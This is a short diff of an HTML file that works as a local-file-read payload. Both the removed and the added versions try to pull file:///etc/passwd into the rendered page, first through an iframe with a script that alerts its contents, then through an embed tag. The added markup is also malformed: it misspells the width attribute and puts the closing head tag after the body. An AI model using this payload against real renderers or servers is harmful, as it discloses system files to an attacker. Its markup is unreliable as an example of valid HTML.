@@ -1,13 +1,7 @@
 <html>
 <head>
-<script>
-function readfile() {
-    alert(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);
-}
-</script>
-</head>
 <body>
-<iframe id='iframe' src = 'file:///etc/passwd' onload='readfile()'> </iframe>
-<h1>Hello World!</h1>
+<embed type="text/html" src="file:///etc/passwd" widht="1000" height="1000"> 
 </body>
+</head>
 </html>
